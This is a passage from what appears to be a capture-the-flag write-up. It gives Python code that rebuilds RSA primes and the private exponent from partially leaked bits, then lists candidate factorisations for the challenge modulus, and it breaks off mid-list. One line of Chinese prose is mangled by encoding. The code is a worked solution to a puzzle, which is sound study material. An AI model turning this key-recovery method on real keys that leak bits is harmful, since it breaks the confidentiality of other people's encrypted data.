class="string">&#x27;1&#x27;</span>, <span class="number">796</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">761</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">113</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">752</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">818</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">797</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">390</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">337</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">133</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">367</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">470</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">345</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">170</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">312</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">624</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">53</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">75</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">281</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">522</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">100</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">554</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">583</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">16</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">836</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">715</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">450</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">484</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">876</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">165</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">842</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">62</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">442</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">927</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">586</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">399</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">227</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">886</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">663</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">947</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">906</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">377</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">246</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">365</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">177</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">59</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">63</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">936</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">144</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">416</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">228</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">366</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">117</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">78</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">717</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">14</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">800</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">47</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">80</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">34</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">662</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">970</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">986</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">287</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">597</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">783</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">805</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">112</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">671</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">540</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">153</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">577</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">543</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">414</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">123</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">626</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">452</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">810</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">30</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">905</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">602</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">537</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">374</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">408</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">434</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">137</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">532</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">397</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">333</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">258</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">359</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">134</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">322</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">653</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">1018</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">639</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">40</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">826</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">489</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">5</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">858</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">44</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">516</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">149</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">945</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">106</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">694</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">221</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">207</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">186</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">316</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">449</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">297</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">276</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">103</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">437</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">802</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">108</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">921</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">427</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">728</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">879</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">953</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">51</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">459</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">37</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">559</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">610</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">341</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">299</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">952</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">201</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">327</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">741</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">253</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">310</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">946</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">696</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">398</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">266</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">829</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">908</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">469</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">873</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">658</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">798</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">54</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">621</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">238</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">654</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">205</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">925</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">391</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">480</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">4</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">598</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">677</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">142</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">606</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">118</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">164</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">973</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">347</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">159</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">307</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">83</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">668</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">675</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">924</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">191</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">890</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">352</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">965</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">692</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">782</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">817</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">889</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">515</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">433</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">356</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">845</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">104</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">18</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">979</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">426</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">785</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">546</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">52</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">55</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">824</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">704</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">510</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">710</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">1022</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">647</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">465</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">245</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">850</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">657</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">1007</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">807</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">158</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">328</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">292</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">355</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">596</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">275</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">371</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">1004</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">594</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">384</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">446</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">7</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">994</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">616</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">317</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">305</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">151</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">400</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">900</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">203</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">563</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">745</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">536</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">726</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">751</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">402</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">116</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">781</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">988</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">768</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">688</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">954</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">976</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">868</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">723</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">131</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">794</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">513</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">914</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">641</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">319</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">629</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">620</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">711</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">601</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">531</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">393</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">168</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">132</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">17</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">950</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">488</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">679</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">568</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">43</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">545</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">217</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">680</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">501</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">1008</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">514</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">746</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">187</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">436</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">336</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">139</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">338</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">695</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">300</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">584</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">152</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">828</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">251</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">691</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">296</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">128</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">394</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">655</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">544</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">58</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">313</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">565</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">685</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">720</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">178</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">667</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">403</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">697</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">138</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">659</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">960</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">454</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">271</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">33</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">295</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">600</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">579</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">68</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">211</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">82</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">114</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">209</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">226</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">753</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">874</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">903</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">358</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">141</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">236</span>: <span class="string">&#x27;1&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getnum</span>(<span class="params">hint, bit</span>):</span></span><br><span class="line">    s = [<span class="string">&#x27;?&#x27;</span>] * bit</span><br><span class="line">    <span class="keyword">for</span> tmp <span class="keyword">in</span> hint.items():</span><br><span class="line">        s[tmp[<span class="number">0</span>]] = tmp[<span class="number">1</span>]</span><br><span class="line">    ss = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> ss.join(s)</span><br><span class="line"></span><br><span class="line">p_corr = getnum(hint1, <span class="number">512</span>)</span><br><span class="line">q_corr = getnum(hint2, <span class="number">512</span>)</span><br><span class="line">d_corr = getnum(hint3, <span class="number">1024</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;p = &#x27;</span>, p_corr)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;q = &#x27;</span>, q_corr)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;d = &#x27;</span>, d_corr)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_s</span>(<span class="params">x</span>):</span></span><br><span class="line">    <span class="keyword">if</span> (x == <span class="string">&#x27;?&#x27;</span>):</span><br><span class="line">        <span class="keyword">return</span> [<span class="number">0</span>, <span class="number">1</span>]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> [<span class="built_in">int</span>(x)]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">update_3_k</span>(<span class="params">total_len</span>):</span></span><br><span class="line">    cur_ans = [(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>)] <span class="comment"># d, p, q, k</span></span><br><span class="line">    mod_num = <span class="number">1</span></span><br><span class="line">    cur_num = <span class="number">1</span></span><br><span class="line">    k = <span class="number">1972411342</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(total_len):</span><br><span class="line">        mod_num *= <span class="number">2</span></span><br><span class="line">        nxt_ans = []</span><br><span class="line">        pset, qset, dset = <span class="built_in">set</span>(), <span class="built_in">set</span>(), <span class="built_in">set</span>()</span><br><span class="line">        <span class="keyword">for</span> d, p, q <span class="keyword">in</span> cur_ans:</span><br><span class="line">            <span class="keyword">for</span> cur_p <span class="keyword">in</span> get_s(p_corr[- i - <span class="number">1</span>]):</span><br><span class="line">                nxt_p = p + cur_p * cur_num</span><br><span class="line">                <span class="keyword">for</span> cur_q <span class="keyword">in</span> get_s(q_corr[- i - <span class="number">1</span>]):</span><br><span class="line">                    nxt_q = q + cur_q * cur_num</span><br><span class="line">                    <span class="comment"># check n = pq</span></span><br><span class="line">                    nxt_n = nxt_p * nxt_q % mod_num</span><br><span class="line">                    <span class="keyword">if</span> (n % mod_num == nxt_n):</span><br><span class="line">                        <span class="keyword">for</span> cur_d <span class="keyword">in</span> get_s(d_corr[- i -  <span class="number">1</span>]):</span><br><span class="line">                            nxt_d = d + cur_d * cur_num</span><br><span class="line">                            <span class="comment"># check phi</span></span><br><span class="line">                            <span class="keyword">if</span> (e * nxt_d % mod_num == (k * (nxt_p - <span class="number">1</span>) % mod_num * (nxt_q - <span class="number">1</span>) + <span class="number">1</span>) % mod_num):</span><br><span class="line">                                <span class="comment"># ok</span></span><br><span class="line">                                nxt_ans.append((nxt_d, nxt_p, nxt_q))</span><br><span class="line">                                pset.add(nxt_p)</span><br><span class="line">                                qset.add(nxt_q)</span><br><span class="line">                                dset.add(nxt_d)</span><br><span class="line">        cur_ans = nxt_ans</span><br><span class="line">        cur_num *= <span class="number">2</span></span><br><span class="line">        <span class="built_in">print</span>(i, <span class="built_in">len</span>(cur_ans), cur_ans[-<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;number of p:&#x27;</span>, <span class="built_in">len</span>(pset))</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;number of q:&#x27;</span>, <span class="built_in">len</span>(qset))</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;number of d:&#x27;</span>, <span class="built_in">len</span>(dset))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> cur_ans</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(update_3_k(<span class="number">512</span>))</span><br></pre></td></tr></table></figure><p>åˆ†è§£ä¹‹åå°±æœ‰äº†</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">n = <span class="number">73380160475470842653695210816683702314062827937540324056880543809752271506601290265975543542548117392788987830919581511428492717214125296973338501980504384307279414528799452106399062576988406269897425829853390463840834798274139351938197666753546672052277640048588091137812362810008344723302886421059831149393</span></span><br><span class="line">e = <span class="number">3116872133</span></span><br><span class="line">c = <span class="number">69574121902821459446683688068339366486115223765903849266663001038736496551168104587683366853482649748413400537793260948337629422998336301256862519087984048032673577462034223842650399943613576577927825123830629917138007035313624847266208032195071033675853881447717750353382112841885318776240405314057286867952</span></span><br><span class="line"></span><br><span class="line">sol_list = [(<span class="number">7784868472609835283772369288450719687831855595004708832036599005696915154950995935461077898788049056940742159122868259556603407924884969346573163242612229</span>, <span class="number">5366239629682084697715680375675183284975073589647891453436177052547030069350226021009383094270291268448822558390838025112113425896384691203885755013446291</span>, <span class="number">7752453331027896289378165428906797427594364441082026942376869840211846057088210327758608246566696642059981985937946346433942230652922826983630336158233867</span>), (<span class="number">7784868472609835283772369288450719687831855595004708832036599005696915154950995935461077898788049056940742159122868259556603407924884969346573163242612229</span>, <span class="number">12070143594653383247502692874778106348714756499944088142297957774407912084386999509410320243353742982293838487484081050538990367302357976177102579516488339</span>, <span class="number">1048549366056597739591152929803874363854681530785830253515089118350964042051436839357671097483244928214966056844703321007065289246949542010413511655191819</span>), (<span class="number">1080964507638536733985356789347796624092172684708512143174818283836033139914222447060140749704597343095726230029625234129726466518911684373356338739570181</span>, <span class="number">2433281645007141582183862407317654444588962316393305402059147986732894187771637619833973091546281143641628089412544201487854764031271379028103394293365395</span>, <span class="number">7333459333217190130016477147712864736110634259188514649323008545095540931148411984733549674748980909944668490369618657344762421815049496672804284626793739</span>), (<span class="number">1080964507638536733985356789347796624092172684708512143174818283836033139914222447060140749704597343095726230029625234129726466518911684373356338739570181</span>, <span class="number">9137185609978440131970874906420577508328645226689502090920928708593776202808411108234910240629732857486644018505787226914731705437244664001320218796407443</span>, <span class="number">629555368245891580229464648609941672370951348892317960461227823234658916111638496332612525665529196099652561276375631917885480409076211699587460123751691</span>), (<span class="number">7919489015169557662429127754565768355549835525176027430319638757565113735078207393658554845331317666676034000955470463920503224389516790946448824722679301</span>, <span class="number">1802354785201290177466884084338089546571783201683146314594751112680946785671485962333750690939270314498621839653134209205738944793709927368604997459819155</span>, <span class="number">1938968369951956383692914074846193565952605977994141608508479664130135156436350531430956937073490508744644524832859364144490425643565423141221879893357835</span>), (<span class="number">7919489015169557662429127754565768355549835525176027430319638757565113735078207393658554845331317666676034000955470463920503224389516790946448824722679301</span>, <span class="number">8506258750172588727253896583441012610311466111979343003456531834541828800708259450734687840022722028343637768746377234632615886199683212341821821962861203</span>, <span class="number">8642872334923254933479926573949116629692288888290338297370260385991017171473124019831894086156942222589660453926102389571367367049538708114438704396399883</span>), (<span class="number">1215585050198259112642115255462845291810152614879830741457858035704231720041433905257617696247865952831018071862227438493626282983543505973232000219637253</span>, <span class="number">5573300765497645611722078615083483769925354838724756952079502768727692919129671049559277837298711903536443299768083411008357224334569900166039461242780307</span>, <span class="number">8223878337112548774118238292755183938208558706396826004316399090874712045533325676806835514339226490474346958357774700482187558211665377803612652864959755</span>), (<span class="number">1215585050198259112642115255462845291810152614879830741457858035704231720041433905257617696247865952831018071862227438493626282983543505973232000219637253</span>, <span class="number">12277204730468944161509091114186406833665037749020953640941283490588574934166444537960214986382163617381459228861326436435234165740543185139256285745822355</span>, <span class="number">1519974372141250224331225793652260874468875796100629315454618369013830030496552188405898365255774776629331029264531675055310616805692092830395828361917707</span>), (<span class="number">7734921245373868987957633397815241793128376406577702659406870494917041423397863464444263406492935867521512547965938537313634187669740963333142964343301637</span>, <span class="number">2039677277102509201846962486845547473896091736477285128799254489086577739322976113889959601594776791686842028494481573651372391063246536352650723217029779</span>, <span class="number">1257898532286632316712997010434751098568684325677402896642438617119803235501528656939875312897703963741941819407675370807672885257529089521223286466966795</span>), (<span class="number">7734921245373868987957633397815241793128376406577702659406870494917041423397863464444263406492935867521512547965938537313634187669740963333142964343301637</span>, <span class="number">8743581242073807751633974985948470537635774646773481817661035210947459754359749602290896750678228505531857957587724599078249332469219821325867547720071827</span>, <span class="number">7961802497257930866500009509537674162308367235973599585504219338980685250538302145340812461981155677586957748500918396234549826663502374494440110970008843</span>), (<span class="number">1031017280402570438170620898712318729388693496281505970545089773056159408361089976043326257409484153676496618872695511886757246263767678359926139840259589</span>, <span class="number">5810623257398864636102157017590941697249663373518895766284006145133323872781161201115486747954218380724663488609430775453990670604106509150085186999990931</span>, <span class="number">7542808499447224707138321228343741470824637054080087292450358043864380124598503802315753890163439945471644252932590707145370017825629044183614059438568715</span>), (<span class="number">1031017280402570438170620898712318729388693496281505970545089773056159408361089976043326257409484153676496618872695511886757246263767678359926139840259589</span>, <span class="number">12514527222370163185889169516693864760989346283815092455145786866994205887817934689516423897037670094569679417702673800880867612010079794123302011503032979</span>, <span 